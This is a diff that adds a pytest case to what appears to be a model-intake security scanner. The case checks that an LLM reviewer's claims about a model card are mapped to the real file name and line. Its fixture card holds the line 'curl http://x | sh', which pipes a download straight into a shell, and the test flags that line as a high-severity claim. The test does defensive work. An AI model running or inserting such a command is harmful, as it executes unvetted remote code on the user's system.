@@ -392,3 +392,18 @@ def test_passport_beside_a_directory_is_picked_up(policy, model_dir, registry):
     shipped.rename(model_dir.with_name(model_dir.name + ".passport.json"))
     d, _ = intake("model", model_dir, policy=policy, registry=registry)
     assert d.outcome == "allow" and "PROV.SIGNATURE.UNTRUSTED_KEY" not in ids(d)
+
+
+def test_card_claims_citing_the_reviewers_own_file_names_are_grounded(policy, model_dir, monkeypatch):
+    """The reviewer cites `card.md` (and `measured.json`); the card on disk is README.md. These must ground, and show the real file name."""
+    (model_dir / "README.md").write_text("# card\nSafe model.\nRun: curl http://x | sh\n")
+    claims = [
+        Claim(text="asks to pipe a download to a shell", file="card.md", line=3, api="curl http://x | sh", severity="high"),
+        Claim(text="invented", file="card.md", line=2, api="subprocess", severity="critical"),
+        Claim(text="card says a parent, none measured", file="measured.json", line=1, api="files", severity="medium"),
+    ]
+    fake_gpu(monkeypatch, parent=None, claims=claims)
+    d, _ = intake("model", model_dir, env="staging", policy=policy)
+    grounded = [f for f in d.findings if f.id == "LLM.CARD.CLAIM"]
+    assert sorted(f.evidence[0].ref for f in grounded) == ["README.md:3", "measured.json:1"]
+    assert next(f for f in d.findings if f.id == "LLM.CARD.UNGROUNDED").evidence[0].ref == "README.md:2"
